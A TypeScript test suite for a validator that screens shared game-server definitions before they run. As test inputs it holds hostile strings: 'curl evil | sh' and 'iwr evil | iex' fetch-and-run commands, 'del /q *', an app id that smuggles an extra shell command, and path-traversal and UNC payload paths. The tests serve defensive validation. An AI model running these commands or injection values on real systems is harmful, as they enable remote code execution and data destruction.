import { describe, it, expect } from "vitest";
import { vetUntrustedSpec, isSafeRelativePath, unsafeRegexReason } from "../untrusted";
import { BUILTIN_DEFINITIONS } from "../builtins";

// The gate for definitions written by someone else (marketplace realms,
// imported files). Each "refuses" case is a way a shared definition could
// otherwise run something the deployer never agreed to.

const steamSpec = (over: Record<string, any> = {}) => ({
  install: { appId: "896660", installSubDir: "valheim", checkFile: "valheim_server.exe", requiredDiskGB: 2 },
  launch: { executable: "valheim_server.exe", args: ["-name", "{name}", "-port", "{port}"] },
  defaultPort: 2456,
  params: [],
  configFiles: [],
  ports: [{ protocol: "UDP", port: "{port}" }],
  ...over,
});

const downloadSpec = (over: Record<string, any> = {}) => ({
  install: {
    url: "https://github.com/someone/game-server/releases/download/v1/server.zip",
    fileName: "server.zip",
    checkFile: "server.exe",
    unzip: true,
  },
  launch: { executable: "server.exe", args: [] },
  defaultPort: 7777,
  params: [],
  configFiles: [],
  ports: [],
  ...over,
});

function errorsOf(raw: unknown): string {
  const result = vetUntrustedSpec(raw);
  if (result.ok) throw new Error("expected the spec to be refused, but it passed");
  return result.errors.join(" | ");
}

describe("vetUntrustedSpec: accepts data-only definitions", () => {
  it("passes a Steam definition and summarizes exactly what runs", () => {
    const result = vetUntrustedSpec(steamSpec());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.installMethod).toBe("STEAMCMD");
    expect(result.summary).toMatchObject({
      source: "Steam app 896660",
      executable: "valheim_server.exe",
      usesBundledJava: false,
      args: ["-name", "{name}", "-port", "{port}"],
      ports: ["{port}/UDP"],
    });
  });

  it("passes an allowlisted download and reports the URL as the source", () => {
    const result = vetUntrustedSpec(downloadSpec());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.installMethod).toBe("DOWNLOAD");
    expect(result.summary.source).toBe("https://github.com/someone/game-server/releases/download/v1/server.zip");
  });

  it("allows java only as the bundled runtime", () => {
    const result = vetUntrustedSpec(
      downloadSpec({
        requiresJava: true,
        launch: { executable: "java", executableOnPath: true, args: ["-Xmx{ram}G", "-jar", "server.jar", "nogui"] },
      })
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.summary.usesBundledJava).toBe(true);
  });

  it("normalizes: numeric app ids become strings, listing metadata is lifted out, unknown keys are dropped", () => {
    const result = vetUntrustedSpec({
      ...steamSpec({ install: { appId: 896660, installSubDir: "valheim", checkFile: "valheim_server.exe", requiredDiskGB: 2 } }),
      name: "Valheim Plus",
      recommendedRamGB: 6,
      somethingFromTheFuture: { run: "anything" },
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect((result.spec.install as any).appId).toBe("896660");
    expect(result.meta).toMatchObject({ name: "Valheim Plus", recommendedRamGB: 6 });
    expect(result.spec).not.toHaveProperty("name");
    expect(result.spec).not.toHaveProperty("somethingFromTheFuture");
  });

  it("stays compatible with the built-in definitions that are already data-only", () => {
    // Built-ins are trusted and never pass through this gate; the point is
    // that the gate's shape tracks the real spec format. Any built-in using
    // only what shared definitions may use must be accepted unchanged.
    const dataOnly = BUILTIN_DEFINITIONS.filter(
      (d) =>
        d.installMethod !== "CUSTOM_SCRIPT" &&
        (!d.spec.launch.executableOnPath || (d.spec.requiresJava && d.spec.launch.executable === "java")) &&
        (!d.spec.container?.image || d.spec.container.image === "cm2network/steamcmd") &&
        !d.spec.container?.executableOnPath
    );
    expect(dataOnly.length).toBeGreaterThan(0);
    for (const def of dataOnly) {
      const result = vetUntrustedSpec(JSON.parse(JSON.stringify(def.spec)));
      expect(result.ok ? [] : [def.slug, ...result.errors]).toEqual([]);
    }
  });
});

describe("vetUntrustedSpec: refuses code execution outside the declared program", () => {
  it("refuses install and launch scripts", () => {
    expect(errorsOf(steamSpec({ launch: { executable: "x.exe", args: [], launchScript: "curl evil | sh" } }))).toMatch(/launch script/);
    expect(errorsOf({ ...steamSpec(), install: { installScript: "del /q *" } })).toMatch(/install script/);
  });

  it("refuses a definition with no install block (it would otherwise be treated as script-based)", () => {
    const { install: _install, ...noInstall } = steamSpec();
    expect(vetUntrustedSpec(noInstall).ok).toBe(false);
  });

  it("refuses PATH executables such as powershell or cmd", () => {
    const spec = steamSpec({
      launch: { executable: "powershell.exe", executableOnPath: true, args: ["-NoProfile", "-Command", "iwr evil | iex"] },
    });
    expect(errorsOf(spec)).toMatch(/system PATH/);
    expect(errorsOf(steamSpec({ launch: { executable: "cmd.exe", executableOnPath: true, args: ["/c", "x"] } }))).toMatch(/system PATH/);
  });

  it("refuses PATH java unless the definition declares requiresJava", () => {
    expect(errorsOf(steamSpec({ launch: { executable: "java", executableOnPath: true, args: [] } }))).toMatch(/system PATH/);
  });

  it.each([
    ["parent traversal", "..\\..\\Windows\\System32\\cmd.exe"],
    ["posix traversal", "../../bin/sh"],
    ["absolute windows path", "C:\\Windows\\System32\\cmd.exe"],
    ["absolute posix path", "/bin/sh"],
    ["UNC share", "\\\\evil.example\\share\\payload.exe"],
    ["drive-relative path", "C:payload.exe"],
  ])("refuses an executable outside the server folder (%s)", (_label, executable) => {
    expect(errorsOf(steamSpec({ launch: { executable, args: [] } }))).toMatch(/launch\.executable/);
  });

  it("refuses environment variables that redirect what gets loaded", () => {
    for (const name of ["PATH", "JAVA_TOOL_OPTIONS", "LD_PRELOAD", "NODE_OPTIONS", "DOTNET_STARTUP_HOOKS", "path"]) {
      expect(errorsOf(steamSpec({ launch: { executable: "x.exe", args: [], env: { [name]: "anything" } } }))).toMatch(
        new RegExp(`may not set "${name}"`)
      );
    }
    // Ordinary game settings are fine.
    expect(vetUntrustedSpec(steamSpec({ launch: { executable: "x.exe", args: [], env: { SteamAppId: "892970" } } })).ok).toBe(true);
  });

  it("refuses custom container images and container PATH executables", () => {
    expect(errorsOf(steamSpec({ container: { image: "evil/miner:latest", executable: "server" } }))).toMatch(/container\.image/);
    expect(errorsOf(steamSpec({ container: { executable: "bash", executableOnPath: true } }))).toMatch(/container\.executableOnPath/);
    expect(vetUntrustedSpec(steamSpec({ container: { image: "cm2network/steamcmd", executable: "valheim_server.x86_64" } })).ok).toBe(true);
  });

  it("leaves container env alone — the container is the boundary, and Linux servers need LD_LIBRARY_PATH", () => {
    const spec = steamSpec({
      container: { executable: "valheim_server.x86_64", env: { LD_LIBRARY_PATH: "./linux64", HOME: "/home/steam" } },
    });
    expect(vetUntrustedSpec(spec).ok).toBe(true);
  });
});

describe("vetUntrustedSpec: refuses writes outside the server folder and non-config files", () => {
  it.each([
    ["traversal", "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.txt"],
    ["absolute", "C:\\Users\\Public\\x.ini"],
    ["alternate data stream", "server.cfg:hidden"],
    ["device name", "NUL.txt"],
  ])("refuses a config path that escapes (%s)", (_label, badPath) => {
    expect(errorsOf(steamSpec({ configFiles: [{ path: badPath, strategy: "template", template: "x" }] }))).toMatch(/configFiles/);
  });

  it("refuses config files that are really programs or scripts", () => {
    for (const p of ["start.bat", "payload.exe", "hook.ps1", "autoexec.lua", "lib/evil.dll"]) {
      expect(errorsOf(steamSpec({ configFiles: [{ path: p, strategy: "template", template: "x" }] }))).toMatch(/not a configuration file type/);
    }
    expect(vetUntrustedSpec(steamSpec({ configFiles: [{ path: "cfg/server.cfg", strategy: "template", template: "hostname {name}" }] })).ok).toBe(true);
  });

  it("refuses launching a file the definition wrote itself", () => {
    const spec = steamSpec({
      launch: { executable: "Run.TXT", args: [] },
      configFiles: [{ path: "run.txt", strategy: "template", template: "x" }],
    });
    expect(errorsOf(spec)).toMatch(/cannot be a file the definition itself writes/);
  });

  it("refuses unsafe install paths", () => {
    expect(errorsOf(steamSpec({ install: { appId: "1", installSubDir: "..\\..", checkFile: "x", requiredDiskGB: 1 } }))).toMatch(/installSubDir/);
    expect(errorsOf(downloadSpec({ install: { url: "https://github.com/a/b/c.zip", fileName: "..\\c.zip", checkFile: "x" } }))).toMatch(/fileName/);
  });
});

describe("vetUntrustedSpec: refuses untrusted download sources", () => {
  it.each([
    ["an unlisted host", "https://evil.example/server.zip", /not on the trusted download list/],
    ["a lookalike host", "https://github.com.evil.example/server.zip", /not on the trusted download list/],
    ["plain http", "http://github.com/a/b/server.zip", /https/],
    ["embedded credentials", "https://user:pw@github.com/a/b/server.zip", /credentials/],
    ["a custom port", "https://github.com:8443/a/b/server.zip", /custom port/],
    ["a non-URL", "not a url", /valid URL/],
  ])("refuses %s", (_label, url, pattern) => {
    expect(errorsOf(downloadSpec({ install: { url, fileName: "server.zip", checkFile: "server.exe" } }))).toMatch(pattern);
  });

  it("accepts subdomains of trusted hosts", () => {
    const spec = downloadSpec({
      install: { url: "https://raw.githubusercontent.com/a/b/main/server.zip", fileName: "server.zip", checkFile: "server.exe" },
    });
    expect(vetUntrustedSpec(spec).ok).toBe(true);
  });

  it("refuses a Steam app id that is not purely numeric (it reaches a command line on remote hosts)", () => {
    const spec = steamSpec({ install: { appId: "896660 +quit; curl evil | sh", installSubDir: "v", checkFile: "x", requiredDiskGB: 1 } });
    expect(errorsOf(spec)).toMatch(/numeric Steam app id/);
  });

  it("refuses specifying both a Steam app and a download", () => {
    const spec = steamSpec({
      install: { appId: "1", installSubDir: "v", checkFile: "x", requiredDiskGB: 1, url: "https://github.com/a/b/c.zip" },
    });
    expect(errorsOf(spec)).toMatch(/exactly one/);
  });
});

describe("vetUntrustedSpec: structural limits", () => {
  it("refuses non-objects and oversized specs", () => {
    expect(vetUntrustedSpec(null).ok).toBe(false);
    expect(vetUntrustedSpec("{}").ok).toBe(false);
    expect(vetUntrustedSpec([steamSpec()]).ok).toBe(false);
    const huge = steamSpec({ configFiles: [{ path: "a.cfg", strategy: "template", template: "x".repeat(70 * 1024) }] });
    expect(errorsOf(huge)).toMatch(/too large/);
  });

  it("refuses unknown template variables (inherited from validateSpec)", () => {
    expect(errorsOf(steamSpec({ launch: { executable: "x.exe", args: ["{notAParam}"] } }))).toMatch(/Unknown template variable/);
  });

  it("refuses params that shadow built-in variables or are not identifiers", () => {
    expect(errorsOf(steamSpec({ params: [{ key: "port", label: "Port", type: "number" }] }))).toMatch(/collides/);
    expect(vetUntrustedSpec(steamSpec({ params: [{ key: "__proto__", label: "x", type: "text" }] })).ok).toBe(false);
  });

  it("refuses ready/stdout patterns that could hang the dashboard", () => {
    expect(errorsOf(steamSpec({ launch: { executable: "x.exe", args: [], readyPattern: "(a+)+$" } }))).toMatch(/repeats a group/);
    expect(vetUntrustedSpec(steamSpec({ launch: { executable: "x.exe", args: [], readyPattern: "Game server (started|listening on port \\d+)" } })).ok).toBe(true);
  });
});

describe("isSafeRelativePath", () => {
  it("accepts ordinary nested relative paths", () => {
    for (const p of ["server.exe", "bin/server.exe", "Pal\\Binaries\\Win64\\PalServer.exe", "./start", "cfg/server.cfg"]) {
      expect(isSafeRelativePath(p)).toBe(true);
    }
  });

  it("refuses empty, control-character, and overlong paths", () => {
    expect(isSafeRelativePath("")).toBe(false);
    expect(isSafeRelativePath("a\nb")).toBe(false);
    expect(isSafeRelativePath("a".repeat(300))).toBe(false);
  });
});

describe("unsafeRegexReason", () => {
  it("flags nested repetition at any depth, and nothing else", () => {
    expect(unsafeRegexReason("(a+)+")).toMatch(/repeats/);
    expect(unsafeRegexReason("((a+))+")).toMatch(/repeats/);
    expect(unsafeRegexReason("(a|b+)*")).toMatch(/repeats/);
    expect(unsafeRegexReason("((ab)+c)*")).toMatch(/repeats/);
    expect(unsafeRegexReason("Done \\(\\d+\\.\\d+s\\)!")).toBeNull();
    expect(unsafeRegexReason("(INFO|WARN): server started")).toBeNull();
    expect(unsafeRegexReason("[(a+)+]")).toBeNull();
  });

  it("flags invalid and overlong patterns", () => {
    expect(unsafeRegexReason("(unclosed")).toMatch(/not a valid/);
    expect(unsafeRegexReason("a".repeat(201))).toMatch(/longer than/);
  });
});
